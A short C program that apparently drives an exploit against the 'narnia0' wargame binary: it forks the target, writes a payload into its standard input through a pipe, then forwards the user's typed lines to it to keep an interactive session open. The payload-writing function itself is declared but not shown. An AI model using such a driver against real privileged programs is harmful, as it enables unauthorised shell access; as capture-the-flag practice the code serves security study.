#include <unistd.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#define PROMPT "exploit> "

typedef struct string {
    char    *buf;
    size_t  len;
    size_t  size;
} String;

void write_payload(int fd);
String *retrieve_line(char *prompt);
int add_char(String *str, char c);

void    inject_payload(char **envp) {
    int    pid;
    int    pipefds[2];
    String  *line;
    //int     o_stdin;
    char    *args[2];
    *args = "./narnia0";
    *(args + 1) = NULL;

    if (pipe(pipefds) < 0) {
        return ;
    }
    pid = fork();
    if (pid < 0) {
        return;
    }
    if (! pid) {
        //o_stdin = dup(STDIN_FILENO);
        close(pipefds[1]);
        dup2(pipefds[0], STDIN_FILENO);
        close(pipefds[0]);
        execve("./narnia0", args, envp);
    }
    else {
        close(pipefds[0]);
        write_payload(pipefds[1]);
        line = retrieve_line(NULL);
        while (line) {
            if (line->len == 0) {
                free(line);
                line = NULL;
                break;
            }
            dprintf(2, "Line(%s)\n", line->buf);
            add_char(line, '\n');
            write(pipefds[1], line->buf, line->len);
            free(line);
            line = retrieve_line(NULL);
        }
        close(pipefds[1]);
        waitpid(pid, NULL, 0);
    }
}

int    main(int argc, char **argv, char **envp) {
    (void)argc;
    (void)argv;
    inject_payload(envp);
    return 0;
}
